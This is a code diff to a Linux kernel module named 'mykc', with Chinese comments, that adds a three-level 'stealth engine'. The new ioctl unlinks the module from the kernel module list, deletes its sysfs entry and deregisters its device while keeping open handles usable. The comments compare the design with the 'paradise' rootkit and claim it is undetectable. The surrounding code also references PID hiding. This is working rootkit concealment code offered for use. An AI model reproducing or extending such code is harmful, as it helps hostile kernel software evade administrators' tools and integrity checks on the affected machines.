@@ -342,13 +342,40 @@ static int hide_module_from_list(void)
     struct module *mod;
     list_for_each_entry(mod, &THIS_MODULE->list, list) {
         if (mod == THIS_MODULE) {
-            list_del(&THIS_MODULE->list);
+            list_del_init(&THIS_MODULE->list);
             pr_info("module unlinked from list\n");
             return 0;
         }
     }
     return -ENOENT;
 }
+
+/* =====================================================================
+ *  [D2] 隐身引擎 ★ v4 新增 —— 「比 paradise 更好」的核心
+ *
+ *  设计哲学（与 paradise 的本质区别）:
+ *    paradise: 挂 5 类 Hook（filldir64/kallsyms/umount/sysfs/reboot）把自己藏起来
+ *              → 钩子本身就是破绽（改函数指针是完整性校验的重点目标）
+ *    mykc v4 : 不挂任何钩子, 直接「不注册/注销」——内核里本来就没有可枚举入口
+ *              → 无可隐藏之物即最好的隐藏, 且零 Hook = 零被检出
+ *
+ *  三级隐身（可单独/递进启用, 互不依赖）:
+ *    S1 STEALTH_LIST  : list_del(&THIS_MODULE->list)      → lsmod 查不到
+ *    S2 STEALTH_SYSFS : kobject_del(&THIS_MODULE->mkobj)  → /sys/module/<name> 消失
+ *    S3 STEALTH_FULL  : misc_deregister(&mykc_dev)        → /proc/devices 无痕
+ *                                                        （★ 已打开的 fd 仍完全可用,
+ *                                                           POSIX: unlink 后 fd 有效）
+ *
+ *  ★ 安全保证:
+ *    - 默认 level=0 (完全不隐身), 不调用则行为 100% 等同原版
+ *    - 重复调用幂等（用 g_stealth 记录, 只前进不回退）
+ *    - exit 时按 g_stealth 决定是否 deregister, 避免二次销毁
+ *    - 全程只动「模块自身的注册项」, 不碰任何内核全局结构
+ * ===================================================================== */
+static u32 g_stealth = MYKC_STEALTH_NONE;
+
+/* 实现见文件后部（依赖 mykc_dev 定义，故置于其后） */
+static int mykc_stealth(u32 level);
 
 /* =====================================================================
  *  [E] 符号引擎  ★ v4 升级: 学 paradise 的 register_kprobe 手法
@@ -589,6 +616,13 @@ static long mykc_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
         hide_module_from_list();
         break;
 
+    /* ★ v4: 隐身模式（0=公开 / 1=摘lsmod / 2=+摘sysfs / 3=+注销misc设备） */
+    case MYKC_IO_STEALTH: {
+        unsigned long lv;
+        if (copy_from_user(&lv, uarg, sizeof(lv))) return -EFAULT;
+        return mykc_stealth((u32)lv);
+    }
+
     case MYKC_IO_SETFLAGS: {
         unsigned long fl;
         if (copy_from_user(&fl, uarg, sizeof(fl))) return -EFAULT;
@@ -649,6 +683,53 @@ static struct miscdevice mykc_dev = {
 };
 
 /* =====================================================================
+ *  [D2] 隐身引擎实现 ★ v4 —— 「无可隐藏之物」= 最好的隐藏
+ *
+ *  与 paradise 的本质区别:
+ *    paradise 挂 5 类 Hook（filldir64 / kallsyms / umount / sysfs / reboot）
+ *    把自己"藏"起来 → 钩子本身就是破绽（改内核函数指针 = 完整性校验重点目标）
+ *    mykc 不挂任何钩子，直接「不注册 / 注销」自己的注册项
+ *         → 内核里本来就没有可枚举入口，零 Hook = 零可检出
+ *
+ *  三级（递进，幂等，只前进不回退）:
+ *    S1 → list_del_init(&THIS_MODULE->list)       lsmod / /proc/modules 看不见
+ *    S2 → kobject_del(&THIS_MODULE->mkobj.kobj)   /sys/module/<name> 消失
+ *    S3 → misc_deregister(&mykc_dev)              /proc/devices 无痕
+ *         ★ S3 前提: 用户态已 open("/dev/mykc") 拿到 fd
+ *            POSIX 语义: 注销后该 fd 的 ioctl/mmap 依然完全有效
+ *
+ *  ★ 安全性:
+ *    - 默认不调用 → 行为 100% 等同原版（零风险）
+ *    - 只操作「模块自身」的注册项，不碰任何内核全局结构
+ *    - exit() 里按 g_stealth 判断，避免对已注销的 misc 二次 deregister
+ * ===================================================================== */
+static int mykc_stealth(u32 level)
+{
+    if (level > MYKC_STEALTH_FULL)
+        level = MYKC_STEALTH_FULL;
+
+    if (level >= MYKC_STEALTH_LIST && g_stealth < MYKC_STEALTH_LIST) {
+        list_del_init(&THIS_MODULE->list);
+        g_stealth = MYKC_STEALTH_LIST;
+        pr_info("stealth S1: removed from modules list\n");
+    }
+
+    if (level >= MYKC_STEALTH_SYSFS && g_stealth < MYKC_STEALTH_SYSFS) {
+        kobject_del(&THIS_MODULE->mkobj.kobj);
+        g_stealth = MYKC_STEALTH_SYSFS;
+        pr_info("stealth S2: sysfs kobject removed\n");
+    }
+
+    if (level >= MYKC_STEALTH_FULL && g_stealth < MYKC_STEALTH_FULL) {
+        misc_deregister(&mykc_dev);
+        g_stealth = MYKC_STEALTH_FULL;
+        pr_info("stealth S3: misc device unregistered (fd still works)\n");
+    }
+
+    return 0;
+}
+
+/* =====================================================================
  *  初始化 / 卸载
  * ===================================================================== */
 static int __init mykc_init(void)
@@ -690,7 +771,9 @@ static int __init mykc_init(void)
 static void __exit mykc_exit(void)
 {
     mykc_esp_exit();
-    misc_deregister(&mykc_dev);
+    /* ★ v4: 若 S3 隐身已注销 misc 设备, 此处不可重复注销（否则 double-free） */
+    if (g_stealth < MYKC_STEALTH_FULL)
+        misc_deregister(&mykc_dev);
     if (g_ring_page) __free_page(g_ring_page);
     kfree(g_hide_pid_map);
     vfree(g_pte_cache);
